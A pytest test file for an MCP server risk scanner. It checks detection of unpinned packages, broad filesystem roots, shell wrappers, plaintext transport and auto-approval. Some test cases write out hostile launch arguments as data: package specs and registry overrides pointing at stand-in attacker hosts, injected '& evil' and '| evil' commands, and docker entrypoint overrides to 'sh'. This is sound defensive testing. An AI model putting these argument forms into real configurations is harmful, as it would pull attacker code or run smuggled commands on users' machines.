"""Static risk checks on configured MCP servers (shadowscan.connectors.mcp_risk)."""

from __future__ import annotations

from pathlib import Path

import pytest

from shadowscan.connectors.mcp_risk import (
    RISK_DESCRIPTIONS,
    McpRisk,
    PackageRef,
    assess_server,
    registry_package,
    server_package,
)
from shadowscan.models import Kind
from shadowscan.risk import assess


def ids(server: dict) -> list[str]:
    return [risk.id for risk in assess_server(server)]


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github"]),
        ("npx", ["-y", "@modelcontextprotocol/server-github@latest"]),
        ("npx", ["@playwright/mcp@^0.0.30"]),
        ("npx", ["--yes", "--package", "mcp-remote", "mcp-remote", "https://example.com"]),
        ("npx", ["--registry", "https://registry.npmjs.org", "some-server"]),
        ("bunx", ["some-server"]),
        ("pnpm", ["dlx", "some-server@next"]),
        ("yarn", ["dlx", "some-server"]),
        ("bun", ["x", "some-server"]),
        ("uvx", ["mcp-server-fetch"]),
        ("uvx", ["--from", "mcp-server-git>=0.6", "mcp-server-git"]),
        ("uvx", ["--python", "3.12", "mcp-server-time"]),
        ("uv", ["tool", "run", "mcp-server-sqlite"]),
        ("pipx", ["run", "mcp-server-fetch"]),
        ("pipx", ["run", "--spec", "mcp-server-git", "mcp-server-git"]),
        ("docker", ["run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/github/github-mcp-server"]),
        ("docker", ["run", "-i", "mcp/fetch:latest"]),
        ("podman", ["run", "--name", "x", "registry.local:5000/mcp/git"]),
        ("npx -y some-server", []),
    ],
)
def test_floating_package_or_image_is_unpinned(command, args):
    assert "mcp-unpinned-package" in ids({"command": command, "args": args})


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github@2025.4.8"]),
        ("npx", ["some-server@1.2.3-beta.1"]),
        ("npx", ["./local/server.js"]),
        ("npx", ["--package=mcp-remote@0.1.9", "mcp-remote"]),
        ("uvx", ["mcp-server-fetch==2025.4.7"]),
        ("uvx", ["mcp-server-fetch@2025.4.7"]),
        ("uvx", ["--from=git+https://github.com/org/repo", "server"]),
        ("pipx", ["run", "--spec", "mcp-server-git==0.6.2", "mcp-server-git"]),
        ("docker", ["run", "-i", "ghcr.io/github/github-mcp-server@sha256:" + "a" * 64]),
        ("docker", ["run", "-i", "mcp/fetch:1.4.2"]),
        ("python", ["-m", "internal_mcp.server"]),
        ("node", ["/opt/servers/index.js"]),
    ],
)
def test_pinned_or_local_server_is_not_unpinned(command, args):
    assert "mcp-unpinned-package" not in ids({"command": command, "args": args})


def test_launcher_without_a_package_is_not_flagged():
    assert ids({"command": "npx", "args": ["-y"]}) == []
    assert ids({"command": "uvx", "args": ["--from"]}) == []
    assert ids({"command": "docker", "args": ["run", "-i"]}) == []


@pytest.mark.parametrize("root", ["/", "~", "$HOME", "/home/dana", "/Users/dana/", "C:\\", "C:\\Users\\dana"])
def test_filesystem_server_rooted_broadly(root):
    server = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", root]}
    assert ids(server) == ["mcp-broad-filesystem"]


def test_filesystem_server_with_project_directory_is_not_broad():
    server = {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/srv/data"],
    }
    assert ids(server) == []


@pytest.mark.parametrize(
    ("command", "args"),
    [("bash", ["-c", "run"]), ("/bin/sh", ["-c", "x"]), ("cmd", ["/c", "x"]), ("pwsh", ["-Command", "x"])],
)
def test_shell_wrapper(command, args):
    assert ids({"command": command, "args": args}) == ["mcp-shell-command"]


def test_shell_without_command_flag_is_not_a_wrapper():
    assert ids({"command": "bash", "args": ["server.sh"]}) == []


@pytest.mark.parametrize(
    ("url", "flagged"),
    [
        ("http://mcp.internal.example:8080/sse", True),
        ("ws://10.0.0.5/mcp", True),
        ("https://mcp.linear.app/sse", False),
        ("http://localhost:3000/mcp", False),
        ("http://127.0.0.1:3000/mcp", False),
        ("http://[::1]:3000/mcp", False),
        ("http://api.localhost/mcp", False),
        ("http:///nohost", False),
        ("http://[bad/mcp", False),
    ],
)
def test_plaintext_remote(url, flagged):
    assert ("mcp-insecure-transport" in ids({"url": url})) is flagged


def test_remote_from_urls_list_and_detail_names_only_the_host():
    risks = assess_server({"urls": ["https://ok.example/mcp", "http://plain.example/mcp?token=x"]})
    assert risks == [McpRisk("mcp-insecure-transport", "plain.example")]
    assert risks[0].description == RISK_DESCRIPTIONS["mcp-insecure-transport"]


@pytest.mark.parametrize(
    ("value", "detail"), [(True, "all tools"), (["*"], "all tools"), (["a", "b"], "2 tool(s)")]
)
def test_auto_approve(value, detail):
    risks = assess_server({"url": "https://x.example/mcp", "auto_approve": value})
    assert risks == [McpRisk("mcp-auto-approve", detail)]


def test_empty_auto_approve_and_malformed_fields_are_ignored():
    assert ids({"url": "https://x.example", "auto_approve": []}) == []
    assert ids({"command": None, "args": "not-a-list", "urls": "nope", "url": 5}) == []


def test_each_risk_is_reported_once():
    server = {"command": "npx", "args": ["a"], "urls": ["http://a.example", "http://b.example"]}
    assert ids(server) == ["mcp-unpinned-package", "mcp-insecure-transport"]


def write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def test_code_connector_tags_risky_servers_and_skips_disabled(run_connector, tmp_path):
    write(
        tmp_path,
        ".mcp.json",
        '{"mcpServers": {"open": {"command": "npx", "args": ["-y", "some-server"]},'
        ' "off": {"command": "uvx", "args": ["other"], "disabled": true},'
        ' "plain": {"url": "http://mcp.example.net/sse"}}}',
    )
    findings, ctx = run_connector("code.filesystem", path=str(tmp_path), label="repo", use_git=False)
    assert not ctx.stats.errors
    (mcp,) = [f for f in findings if f.kind == Kind.MCP_SERVER]
    assert {"mcp-unpinned-package", "mcp-insecure-transport"} <= set(mcp.tags)
    servers = {s["name"]: s for s in mcp.metadata["servers"]}
    assert servers["open"]["risks"] == ["mcp-unpinned-package"]
    assert servers["off"]["risks"] == []
    assert servers["plain"]["risks"] == ["mcp-insecure-transport"]
    risk_evidence = [e for e in mcp.evidence if e.signal.startswith("mcp-risk:")]
    assert risk_evidence and all(e.weight == 0.0 for e in risk_evidence)
    assert any(f.id == "tag:mcp-unpinned-package" for f in assess(mcp).factors)


@pytest.mark.parametrize(
    "url",
    [
        "ws://mcp.example.com/ws",
        "HTTP://mcp.example.com/mcp",
        "http://mcp.example.com/mcp",
        # URL parsers drop tabs and newlines and leading control characters; so must the factor.
        "ht\ttp://mcp.example.com/mcp",
        "http:\n//mcp.example.com/mcp",
        "\x01http://mcp.example.com/mcp",
    ],
)
def test_every_insecure_transport_label_is_scored(url):
    from shadowscan.connectors.mcp_risk import record_server_risks
    from shadowscan.models import Finding, Surface

    server = {"name": "remote", "transport": "http", "url": url}
    f = Finding(
        surface=Surface.CODE,
        connector="code.filesystem",
        kind=Kind.MCP_SERVER,
        title="MCP server",
        resource="repo:x",
        resource_type="mcp-config",
        metadata={"servers": [server]},
    )
    record_server_risks(f, server, ".mcp.json")
    assert "mcp-insecure-transport" in f.tags
    assert "mcp-plain-http" in {factor.id for factor in assess(f).factors}


# ------------------------------------------------------------------ package identity


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        (
            "npx",
            ["-y", "@modelcontextprotocol/server-github@1.2.3"],
            ("npm", "@modelcontextprotocol/server-github", "1.2.3"),
        ),
        ("npx", ["-y", "@Scope/Pkg@latest"], ("npm", "@scope/pkg", None)),
        ("npx", ["@playwright/mcp@^0.0.30"], ("npm", "@playwright/mcp", None)),
        ("npx", ["--yes", "--package", "mcp-remote@0.1.0", "mcp-remote"], ("npm", "mcp-remote", "0.1.0")),
        ("pnpm", ["dlx", "some-server@v2.0.0"], ("npm", "some-server", "2.0.0")),
        ("bun", ["x", "some-server"], ("npm", "some-server", None)),
        ("npx -y foo@1.0.0", [], ("npm", "foo", "1.0.0")),
        ("uvx", ["mcp-server-fetch"], ("pypi", "mcp-server-fetch", None)),
        (
            "uvx",
            ["--from", "MCP_Server.Time==0.6.2", "mcp-server-time"],
            ("pypi", "mcp-server-time", "0.6.2"),
        ),
        ("uvx", ["mcp-server-time[extra]===1.0"], ("pypi", "mcp-server-time", "1.0")),
        ("uv", ["tool", "run", "mcp-server-sqlite@v0.6"], ("pypi", "mcp-server-sqlite", "0.6")),
        (
            "pipx",
            ["run", "--spec", "mcp-server-fetch>=0.6", "mcp-server-fetch"],
            ("pypi", "mcp-server-fetch", None),
        ),
        (
            "docker",
            ["run", "-i", "--rm", "ghcr.io/github/github-mcp-server:2.0.2"],
            ("oci", "ghcr.io/github/github-mcp-server", "2.0.2"),
        ),
        ("docker", ["run", "mcp/fetch:latest"], ("oci", "docker.io/mcp/fetch", None)),
        (
            "docker",
            ["run", "index.docker.io/library/ubuntu@sha256:" + "a" * 64],
            ("oci", "docker.io/library/ubuntu", None),
        ),
        (
            "podman",
            ["run", "--name", "x", "Registry.Local:5000/mcp/time:1.0"],
            ("oci", "registry.local:5000/mcp/time", "1.0"),
        ),
        ("docker", ["run", "alpine"], ("oci", "docker.io/library/alpine", None)),
        # Windows launcher forms.
        ("npx.cmd", ["-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "pkg"], ("npm", "pkg", None)),
        ("uvx.exe", ["pkg==1.0"], ("pypi", "pkg", "1.0")),
        ("cmd", ["/c", "npx", "-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("cmd.exe", ["/d", "/s", "/C", "npx -y pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        # Options that change neither the package nor where it comes from.
        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("npx", ["--loglevel=silent", "-y", "@scope/pkg@1.0.0"], ("npm", "@scope/pkg", "1.0.0")),
        ("npx", ["-p", "@scope/tool@1.0.0", "tool", "--port", "1"], ("npm", "@scope/tool", "1.0.0")),
        ("npx", ["-y", "pkg@>=1.0.0 <2"], ("npm", "pkg", None)),
        ("uvx", ["--python", "3.12", "pkg"], ("pypi", "pkg", None)),
        ("uvx", ["--python=cpython@3.12", "-q", "pkg"], ("pypi", "pkg", None)),
        ("pipx", ["run", "--no-cache", "--spec=pkg==2.0", "pkg"], ("pypi", "pkg", "2.0")),
        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], ("oci", "ghcr.io/acme/tool", "1.0")),
        (
            "docker",
            [
                "run",
                "-it",
                "--gpus=all",
                "-eNAME=x",
                "--shm-size",
                "1g",
                "-a",
                "stdin",
                "ghcr.io/acme/tool:1.0",
            ],
            ("oci", "ghcr.io/acme/tool", "1.0"),
        ),
        (
            "podman",
            ["run", "--sig-proxy=false", "--tls-verify", "quay.io/acme/tool:2"],
            ("oci", "quay.io/acme/tool", "2"),
        ),
    ],
)
def test_server_package_names_the_launched_registry_package(command, args, expected):
    assert server_package({"command": command, "args": args}) == PackageRef(*expected)


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["owner/repo"]),
        ("npx", ["github:owner/repo"]),
        ("npx", ["./local-server"]),
        ("npx", ["npm:alias@1.0.0"]),
        ("npx", ["@scope"]),
        ("npx", ["-y"]),
        ("uvx", ["--from", "https://example.com/server.whl", "server"]),
        ("uvx", ["!!!"]),
        ("docker", ["run", "-i"]),
        ("docker", ["run", "https://example.com/image"]),
        ("docker", ["run", "registry.example.com/"]),
        ("sh", ["-c", "npx -y @acme/server@1.0.0"]),
        ("node", ["server.js"]),
        ("", []),
        (None, []),
        # 'name@' followed by an alias, a Git, GitHub, URL or file source fetches something else.
        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"]),
        ("npx", ["-y", "files@npm:evil-pkg"]),
        ("npx", ["-y", "@acme/files@github:attacker/evil"]),
        ("npx", ["-y", "@acme/files@https://evil.example/e.tgz"]),
        ("npx", ["-y", "@acme/files@git+https://github.com/attacker/evil.git"]),
        ("npx", ["-y", "@acme/files@file:../evil"]),
        ("npx", ["-y", "@acme/files@attacker/evil#main"]),
        # Another registry, configuration, extra package, command or unknown option.
        ("npx", ["-y", "--registry", "https://npm.attacker.example", "@acme/files@1.2.0"]),
        ("npx", ["-y", "--registry=https://npm.attacker.example", "@acme/files@1.2.0"]),
        ("npx", ["--userconfig", "./npmrc", "pkg"]),
        ("npx", ["--@acme:registry=https://npm.attacker.example", "@acme/files"]),
        ("npx", ["-c", "evil", "-p", "pkg"]),
        ("npx", ["-y", "-p", "evil-pkg", "-p", "pkg@1.0.0", "pkg"]),
        ("npx", ["-y", "-p", "pkg@1.0.0", "node", "./evil.js"]),
        ("npx", ["-y", "-p", "pkg@1.0.0"]),
        ("pnpm", ["dlx", "--shell-mode", "pkg"]),
        ("uvx", ["--index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--default-index", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--extra-index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--with", "evil-pkg", "pkg==1.0"]),
        ("uvx", ["--python", "./evil/python", "pkg"]),
        ("uvx", ["--python=..\\python.exe", "pkg"]),
        ("uv", ["tool", "run", "--config-file", "./uv.toml", "pkg"]),
        ("pipx", ["run", "--pip-args=--index-url=https://x.example", "pkg"]),
        ("pipx", ["run", "--index-url", "https://x.example", "pkg"]),
        ("docker", ["run", "--entrypoint", "sh", "ghcr.io/acme/tool:1.0", "-c", "evil"]),
        ("docker", ["run", "--entrypoint=sh", "ghcr.io/acme/tool:1.0"]),
        ("docker", ["run", "--not-a-docker-option", "value", "ghcr.io/acme/tool:1.0"]),
        ("docker", ["run", "-ie", "X=1", "ghcr.io/acme/tool:1.0"]),
        ("cmd", ["/c", "npx -y pkg@1.0.0 & evil"]),
        ("cmd", ["/c", "npx", "-y", "pkg", "|", "evil"]),
        ("cmd", ["/c"]),
        ("cmd", ["/c", "cmd", "/c", "npx", "pkg"]),
        ("cmd", ["/k", "bash", "-c", "npx pkg"]),
    ],
)
def test_server_package_is_none_without_a_registry_package(command, args):
    assert server_package({"command": command, "args": args}) is None


@pytest.mark.parametrize(
    "name",
    ["npm_config_registry", "NPM_CONFIG_USERCONFIG", "UV_INDEX_URL", "UV_DEFAULT_INDEX", "UV_EXTRA_INDEX_URL",
     "UV_TOOL_DIR", "PIP_INDEX_URL", "PIPX_HOME", "DOCKER_HOST", "CONTAINER_HOST"],
)  # fmt: skip
def test_server_package_is_none_when_the_environment_can_change_the_source(name):
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": ["GITHUB_TOKEN", name]}
    assert server_package(server) is None
    assert server_package({**server, "env_names": ["GITHUB_TOKEN", "NODE_ENV"]}) == PackageRef(
        "npm", "pkg", "1.0.0"
    )


def test_server_package_ignores_a_remote_only_server():
    assert server_package({"url": "https://mcp.example.com/mcp", "args": "not a list"}) is None


@pytest.mark.parametrize(
    ("kind", "identifier", "version", "expected"),
    [
        ("npm", "@Acme/MCP-Files", "1.0.0", ("npm", "@acme/mcp-files", "1.0.0")),
        ("pypi", "Acme_Legacy.MCP", "0.9.0", ("pypi", "acme-legacy-mcp", "0.9.0")),
        (
            "OCI",
            "ghcr.io/github/github-mcp-server:2.0.2",
            None,
            ("oci", "ghcr.io/github/github-mcp-server", "2.0.2"),
        ),
        ("oci", "docker.io/mcp/fetch:v1", "1.0", ("oci", "docker.io/mcp/fetch", "1.0")),
        (
            "mcpb",
            "https://example.com/Tool.mcpb",
            "3.0.0",
            ("mcpb", "https://example.com/tool.mcpb", "3.0.0"),
        ),
    ],
)
def test_registry_package_normalizes_like_a_launch(kind, identifier, version, expected):
    assert registry_package(kind, identifier, version) == PackageRef(*expected)


@pytest.mark.parametrize(
    ("kind", "identifier"), [("", "x"), ("npm", " "), ("npm", "owner/repo"), ("pypi", "-x"), ("oci", "-x")]
)
def test_registry_package_rejects_what_names_no_package(kind, identifier):
    assert registry_package(kind, identifier) is None


@pytest.mark.parametrize(
    ("kind", "identifier", "base", "expected"),
    [
        ("npm", "pkg", "https://registry.npmjs.org", ("npm", "pkg", None)),
        ("npm", "pkg", "HTTPS://registry.npmjs.org/", ("npm", "pkg", None)),
        ("pypi", "Pkg", "https://pypi.org", ("pypi", "pkg", None)),
        ("pypi", "pkg", "https://pypi.org/simple/", ("pypi", "pkg", None)),
        ("oci", "ghcr.io/acme/tool:1.0", "https://ghcr.io", ("oci", "ghcr.io/acme/tool", "1.0")),
        ("oci", "acme/tool", "https://docker.io", ("oci", "docker.io/acme/tool", None)),
        ("oci", "acme/tool", "https://index.docker.io/", ("oci", "docker.io/acme/tool", None)),
        ("nuget", "Acme.Tool", "https://api.nuget.org", ("nuget", "acme.tool", None)),
        ("npm", "pkg", "https://npm.acme.internal", None),
        ("pypi", "pkg", "https://pypi.acme.internal/simple", None),
        ("oci", "acme/tool", "https://ghcr.io", None),
        ("oci", "ghcr.io/acme/tool", "https://registry.acme.internal", None),
    ],
)
def test_registry_package_matches_only_the_public_registry_a_launch_fetches_from(
    kind, identifier, base, expected
):
    expected_ref = PackageRef(*expected) if expected is not None else None
    assert registry_package(kind, identifier, None, base) == expected_ref


@pytest.mark.parametrize(
    ("command", "args", "risks"),
    [
        # Windows launcher names are recognized by the risk checks too.
        ("npx.cmd", ["-y", "pkg"], ["mcp-unpinned-package"]),
        ("cmd.exe", ["/c", "npx", "pkg"], ["mcp-shell-command"]),
        # An alias is as pinned as the package it names; a URL with '@' in its path is not a version.
        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"], []),
        ("npx", ["-y", "@acme/files@npm:evil-pkg"], ["mcp-unpinned-package"]),
        ("npx", ["-y", "@acme/files@https://evil.example/p@1.0.0"], ["mcp-unpinned-package"]),
        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], []),
        # --gpus takes a value: the image is the next argument.
        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], []),
    ],
)
def test_launcher_forms_are_assessed_like_the_plain_launch(command, args, risks):
    assert [risk.id for risk in assess_server({"command": command, "args": args})] == risks
